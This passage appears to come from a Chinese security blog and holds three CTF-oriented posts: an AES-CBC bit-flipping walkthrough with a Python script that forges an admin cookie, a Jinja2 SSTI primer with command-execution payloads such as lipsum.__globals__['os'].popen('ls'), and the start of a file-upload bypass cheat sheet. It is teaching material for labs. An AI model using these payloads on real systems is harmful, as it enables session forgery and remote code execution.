&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span>);</span><br><span class="line">        <span class="title function_ invoke__">login</span>(<span class="variable">$info</span>);</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;body class=&quot;login-body&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;wrapper&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;content&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;footer&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x01-AES-CBC-加密、解密过程"><a href="#0x01-AES-CBC-加密、解密过程" class="headerlink" title="0x01 AES-CBC 加密、解密过程"></a>0x01 AES-CBC 加密、解密过程</h1><h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p><img src="https://img-blog.csdnimg.cn/20201227105802353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1YxMDQwMzc1NTc1,size_16,color_FFFFFF,t_70"></p>
<p>Plaintext：明文数据</p>
<p>IV：初始向量</p>
<p>Key：分组加密使用的密钥</p>
<p>Ciphertext：密文数据</p>
<p>明文都是先与混淆数据（第一组是与IV，之后都是与前一组的密文）进行异或，再执行分组加密的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</span><br><span class="line">2、生成一个随机的初始化向量(IV)和一个密钥。</span><br><span class="line">3、将IV和第一组明文异或。</span><br><span class="line">4、用密钥对3中xor后产生的密文加密。</span><br><span class="line">5、用4中产生的密文对第二组明文进行xor操作。</span><br><span class="line">6、用密钥对5中产生的密文加密。</span><br><span class="line">7、重复4-7，到最后一组明文。</span><br><span class="line">8、将IV和加密后的密文拼接在一起，得到最终的密文。</span><br></pre></td></tr></table></figure>

<h2 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h2><p>每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。</p>
<p>对于第一组则是与IV进行异或。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、从密文中提取出IV，然后将密文分组。</span><br><span class="line">2、使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</span><br><span class="line">3、使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</span><br><span class="line">4、重复2-3，直到最后一组密文。</span><br></pre></td></tr></table></figure>

<h1 id="0x02-攻击"><a href="#0x02-攻击" class="headerlink" title="0x02 攻击"></a>0x02 攻击</h1><h2 id="异或的特性"><a href="#异或的特性" class="headerlink" title="异或的特性:"></a>异或的特性:</h2><p>异或是不进位加法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1⊕1=0  //这里1+1=10 进位了，不需要管他</span><br><span class="line">1⊕0=1</span><br><span class="line">0⊕1=1</span><br></pre></td></tr></table></figure>

<p>连续异或两次同一个内容，就相当于没有异或</p>
<p>比如:<br>1100110 ⊕1010100⊕1010100 &#x3D; 1100110</p>
<p>而异或还有交换律,可以随意打乱顺序</p>
<p>1010100 ⊕ 1100110 ⊕1010100 &#x3D; 1100110</p>
<h2 id="1-对于解密时："><a href="#1-对于解密时：" class="headerlink" title="1.对于解密时："></a>1.对于解密时：</h2><p>设明文为X，密文为Y，解密函数为k。</p>
<p><code>X[i] = k(Y[i]) Xor Y[i-1]</code></p>
<h2 id="2-字节翻转"><a href="#2-字节翻转" class="headerlink" title="2.字节翻转"></a>2.字节翻转</h2><p>要改变<code>Cipher1[0]</code>的值为x</p>
<p>则 <code>&#39;a&#39; ^ x = decrypt(cipher2[0])</code></p>
<p>而又因为：<code>Plain2[0] ^ Cipher1[0]=decrypt(cipher2[0])</code></p>
<p>把<code>decrypt(cipher2[0])</code> 代入第一个式子得</p>
<p><code>&#39;a&#39; ^ x = Plain2[0] ^ Cipher1[0]</code></p>
<p><code>解得x= Plain2[0] ^ Cipher1[0] ^ &#39;a&#39;</code></p>
<p>x是我们要赋值的，<code>也就是Cipher1[0] </code>，所以最后写出的语句为：</p>
<p><code>Cipher1[0]=Plain2[0] ^ Cipher1[0] ^ &#39;a&#39;</code></p>
<p><code>Plain2[0]</code>是原明文组2的第一个字节（已知），<code>Cipher1[0]</code>是第一组密文的第一个字节（已知）</p>
<p>此时再把Cipher1和Cipher2连接起来生成Ciphertext，把C，就会成功变成我们想要的明文。</p>
<h2 id="3-修复IV："><a href="#3-修复IV：" class="headerlink" title="3.修复IV："></a>3.修复IV：</h2><p>当我们破坏掉密文的第一组时，同样明文的第一组在解密的时候就并不是原来的明文了，这个时候我们需要修复初始向量IV，给它一个新的值，</p>
<p>使<code>NewIv ^ NewCipher1 = Plain1（原）</code></p>
<p>推导过程：</p>
<p><code>Plain1(损坏) ^ iv = decrypt(newCipher1)</code></p>
<p><code>Newiv=Plain1(原) ^ decrypt(newCipher1)</code> （目的是要给Newiv赋值）</p>
<p>把第一个式子代入到第二个式子中得到：（此时Plain(原) 已知，Plain1(损坏)已知）</p>
<p><code>Newiv=Plain1(原) ^ Plain1(损坏) ^ iv</code></p>
<p>有了Newiv和翻转好的Ciphertext，这时网站后端解密后的明文就是我们构造好的明文了。</p>
<h1 id="0x03-例题"><a href="#0x03-例题" class="headerlink" title="0x03 例题"></a>0x03 例题</h1><p><img src="/images/cbc/1.png"></p>
<p>只有admin才能看flag，而登陆的时候过滤了admin。后端检测的时候使用的是<code>cookie</code>里面的<code>cipher</code>以及<code>iv</code>解密后得到的字符进行反序列化</p>
<p>原文:<br><code>a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admix&quot;;s:8:&quot;password&quot;;s:5:&quot;admix&quot;;&#125;</code></p>
<p>cipher:<br><code>540LbV57RP5K18c1jJeAOk7HOjcMLHthWSvcLRPMmOTUdyvcS8NkZsx%2BjR7cIgNOqIURlke333VwZ8Tv0Ajpkg==</code></p>
<p>iv:<br><code>Ne%2BoeXNBcE%2BuI%2BCrlXqjqw%3D%3D</code></p>
<p>这里cookie可控。</p>
<p>明文加密时分组为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admix&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:2:&quot;123&quot;;&#125;　</span><br></pre></td></tr></table></figure>

<p>这里只需要把<code>admix</code>的<code>x</code>反转成<code>n</code>就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># a:2:&#123;s:8:&quot;userna</span></span><br><span class="line"><span class="comment"># me&quot;;s:5:&quot;admiN&quot;;</span></span><br><span class="line"><span class="comment"># s:8:&quot;password&quot;;s</span></span><br><span class="line"><span class="comment"># :6:&quot;123&quot;;&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#原始cipher</span></span><br><span class="line">ciphertext = <span class="string">&#x27;w1uvgfzxxuYHA%2Bo08ZL%2BCefhwr2jHuwglOIBAh8cP1w5TCiCmY0Yy%2BQxelAl9%2B%2FiZeRvLD7UjzlF58bTGFZ%2BWQ%3D%3D&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line">array_cipher[<span class="number">13</span>] =  array_cipher[<span class="number">13</span>]^ <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="comment">#print(array_cipher)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newCipher:&#x27;</span>,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密后的明文base64</span></span><br><span class="line">decode_plain = base64.b64decode(<span class="string">&#x27;sxvY7wUlyPgC+/iV7InfjG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;</span>)</span><br><span class="line"><span class="comment">#原始iv</span></span><br><span class="line">iv = base64.b64decode(urllib.parse.unquote(<span class="string">&#x27;1HxERxo2%2FTuymbrPoVDB%2Bw%3D%3D&#x27;</span>))</span><br><span class="line"><span class="comment">#原始明文</span></span><br><span class="line">plain = <span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span></span><br><span class="line"></span><br><span class="line">newiv = <span class="built_in">list</span>(iv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    newiv[i] = (<span class="built_in">ord</span>(plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)) ^ iv[i] ^ decode_plain[i])</span><br><span class="line"></span><br><span class="line">newiv = <span class="built_in">bytes</span>(newiv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newiv:&#x27;</span>,urllib.parse.quote(base64.b64encode(newiv)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>小饼干一换就行了。</p>
<h1 id="0x04-Refence"><a href="#0x04-Refence" class="headerlink" title="0x04 Refence"></a>0x04 Refence</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/246058.html">CBC字节翻转攻击解析</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/V1040375575/article/details/111773524?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-111773524-blog-109746592.pc_relevant_vip_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-111773524-blog-109746592.pc_relevant_vip_default&utm_relevant_index=3">[CTF]AES-CBC字节翻转攻击</a></p>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/Crypto/">Crypto</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/XOR/">XOR</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-11-04  <a class="commentCountImg" href="/2022/11/04/ssti%E5%AD%A6%E4%B9%A0/#comment-container"><span class="display-none-class">055048fdc947f3e83f745c2af0a90173</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="055048fdc947f3e83f745c2af0a90173">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>9 分钟  <i class="fas fa-pencil-alt"> </i>1.4 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/11/04/ssti%E5%AD%A6%E4%B9%A0/">SSTI学习</a></h1><div class="content"><p>首先是这广为人知的图片,就放在这里了,嗯，肥肠不错<br><img src="https://img-blog.csdnimg.cn/dceb425de4394352b02eda8462178145.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATDFhbTB1cg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h1 id="0x01-从盘古开天辟地讲起…"><a href="#0x01-从盘古开天辟地讲起…" class="headerlink" title="0x01 从盘古开天辟地讲起…"></a>0x01 从盘古开天辟地讲起…</h1><h2 id="Python-一切皆对象"><a href="#Python-一切皆对象" class="headerlink" title="Python 一切皆对象"></a>Python 一切皆对象</h2><p>首先，我们来梳理一下python里面错综复杂的关系<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_32924159/article/details/113579833">python object基类_Python 一切皆对象</a><br><img src="/images/ssti/6.png"></p>
<p>object是最顶层基类，object是type的实例，而type又继承object，type是自身的实例。</p>
<p>type也是自身的实例化，object创造type，type创造一切和他自己，有点像道生一，一生三，三生万物…..type连自己都不放过，把自己都变成了自己的对象。type自己实例化自己。</p>
<p>object是父子关系的顶端，所有的数据类型的父类都是它；type是类型实例关系的顶端，所有对象都是它的实例的。</p>
<h1 id="0x02-SSTI-原理"><a href="#0x02-SSTI-原理" class="headerlink" title="0x02 SSTI 原理"></a>0x02 SSTI 原理</h1><h2 id="这是四大天王"><a href="#这是四大天王" class="headerlink" title="这是四大天王"></a>这是四大天王</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; for Statements</span><br><span class="line"> </span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output</span><br><span class="line"> </span><br><span class="line">&#123;# ... #&#125; for Comments not included in the template output</span><br><span class="line"> </span><br><span class="line">#  ... ## for Line Statements</span><br></pre></td></tr></table></figure>

<pre><code>&#123;%%&#125;

主要用来声明变量，也可以用于条件语句和循环语句。

    &#123;% set c= 'kawhi' %&#125;
&#123;% if 81==9*9 %&#125;kawhi&#123;% endif %&#125;
&#123;% for i in ['1','2','3'] %&#125;kawhi&#123;%endfor%&#125;

&#123;&#123;&#125;&#125;

用于将表达式打印到模板输出，比如我们一般在里面输入2-1，2*2，或者是字符串，调用对象的方法，都会渲染出结果

    &#123;&#123;2-1&#125;&#125; #输出1
&#123;&#123;2*2&#125;&#125; #输出4
</code></pre>
<p>我们通常会用4简单测试页面是否存在SSTI</p>
<pre><code>&#123;##&#125;

表示未包含在模板输出中的注释

    ##

有和&#123;%%&#125;相同的效果

这里的模板注入主要用到的是&#123;&#123;&#125;&#125;和&#123;%%&#125;
</code></pre>
<h2 id="类的知识总结"><a href="#类的知识总结" class="headerlink" title="类的知识总结"></a>类的知识总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="构造链思路"><a href="#构造链思路" class="headerlink" title="构造链思路:"></a>构造链思路:</h2><blockquote>
<p>找到父类&lt;type ‘object’&gt; —&gt; 寻找子类 —&gt; 找关于命令执行或者文件操作的模块。</p>
</blockquote>
<ul>
<li><p>首先，需要一个类<br><img src="/images/ssti/7.png"></p>
</li>
<li><p>然后，需要获得<code>object</code>类，因为所有的类都是继承自它，可以用<code>__base__</code>,<code>__mro__[-1]</code>拿到</p>
<blockquote>
<blockquote>
<blockquote>
<p>‘’.<strong>class</strong>.<strong>bases</strong>[0]<br>  &lt;class ‘object’&gt;</p>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>‘’.<strong>class</strong>.<strong>base</strong><br>  &lt;class ‘object’&gt;</p>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>‘’.<strong>class</strong>.<strong>mro</strong>[1]<br>  &lt;class ‘object’&gt;<br>‘’.<strong>class</strong>.<strong>mro</strong>[-1]<br>  &lt;class ‘object’&gt;
  </p>
</blockquote>
</blockquote>
</blockquote>
</li>
<li><p>然后，需要用<code>__subclasses__()</code>拿到子类列表</p>
</li>
<li><p>最后，在子类列表里面找到getshell的类</p>
</li>
</ul>
<h1 id="0x03-Bypass"><a href="#0x03-Bypass" class="headerlink" title="0x03 Bypass"></a>0x03 Bypass</h1><p>过滤这部分，已经有文章整理的非常好了，俺就懒得搬运了，挂个链接</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584#toc-33">Flask-jinja2 SSTI 一般利用姿势</a></p>
<h1 id="Refence"><a href="#Refence" class="headerlink" title="Refence"></a>Refence</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/111399386">细说Jinja2之SSTI&amp;bypass</a><br><a target="_blank" rel="noopener" href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html">Python魔法方法指南 - PyZh</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/344951719">Python：实例讲解Python中的魔法函数（高级语法）</a><br><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/2292.html">Python type()函数：动态创建类</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/come_from_pluto/article/details/90483447">Python的MRO</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989">SSTI模板注入总结</a></p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted index-categories" href="/categories/ssti/">ssti</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/python/">python</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/ssti/">ssti</a></div><hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-31  <a class="commentCountImg" href="/2022/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%87%E5%BF%98%E5%BD%95/#comment-container"><span class="display-none-class">4f8f4b548fc6e107aa024ae996ce45d4</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="4f8f4b548fc6e107aa024ae996ce45d4">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>13 分钟  <i class="fas fa-pencil-alt"> </i>2.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%87%E5%BF%98%E5%BD%95/">文件上传备忘录</a></h1><div class="content"><h1 id="0x01-文件上传-前端拦截-懂得都懂，前端拦截-x3D-无效操作"><a href="#0x01-文件上传-前端拦截-懂得都懂，前端拦截-x3D-无效操作" class="headerlink" title="0x01 文件上传-前端拦截 | 懂得都懂，前端拦截&#x3D;无效操作"></a>0x01 文件上传-前端拦截 | 懂得都懂，前端拦截&#x3D;无效操作</h1><h2 id="js检查代码"><a href="#js检查代码" class="headerlink" title="js检查代码"></a>js检查代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload-labs level1</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>传个正常图，然后抓包修改就行了。</p>
<h1 id="0x02-文件上传-后端校验MINE-懂的都懂，还是无效操作"><a href="#0x02-文件上传-后端校验MINE-懂的都懂，还是无效操作" class="headerlink" title="0x02 文件上传-后端校验MINE | 懂的都懂，还是无效操作"></a>0x02 文件上传-后端校验MINE | 懂的都懂，还是无效操作</h1><h2 id="只校验MIME"><a href="#只校验MIME" class="headerlink" title="只校验MIME"></a>只校验MIME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>无效操作，直接修改就完事了<br><img src="/images/upload/1.png"></p>
<p>常见MIMETYPE</p>
<blockquote>
<p>   audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
</blockquote>
